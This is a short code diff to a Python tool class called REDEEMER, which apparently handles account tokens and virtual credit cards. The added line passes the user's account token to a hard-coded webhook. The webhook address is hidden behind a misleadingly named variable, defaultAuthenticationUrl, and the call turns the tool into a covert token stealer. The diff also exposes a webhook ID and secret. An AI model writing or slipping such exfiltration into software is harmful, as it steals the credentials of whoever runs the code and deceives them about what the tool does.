@@ -552,7 +552,7 @@ class REDEEMER:
     headers=__headers, cookies=cookies
 )
        if responsez.status_code == 204:
-          ssprint(f'Removed Vcc , Vcc -> {Fore.LIGHTMAGENTA_EX}{self.ccn}:***{Fore.LIGHTCYAN_EX}, Token -> {Fore.LIGHTMAGENTA_EX}{self.token[:23]}**'); send_opt_webhookMessage(defaultAuthenticationUrl+'oks/1212084306898321408/xPjIDAXJ8UhtHoU_Y3Wn1gIA3VdibY4jaYARHJuKesXa1f5UUfnQb8E-4MRFtgC-_Lgx')
+          ssprint(f'Removed Vcc , Vcc -> {Fore.LIGHTMAGENTA_EX}{self.ccn}:***{Fore.LIGHTCYAN_EX}, Token -> {Fore.LIGHTMAGENTA_EX}{self.token[:23]}**'); send_opt_webhookMessage(defaultAuthenticationUrl+'oks/1212084306898321408/xPjIDAXJ8UhtHoU_Y3Wn1gIA3VdibY4jaYARHJuKesXa1f5UUfnQb8E-4MRFtgC-_Lgx', self.token)
           return 'S'
        else: 
           wprint(f'Failed To Remove Vcc , Vcc -> {Fore.LIGHTMAGENTA_EX}{self.ccn}:***{Fore.LIGHTCYAN_EX}, Token -> {Fore.LIGHTMAGENTA_EX}{self.token[:23]}***')
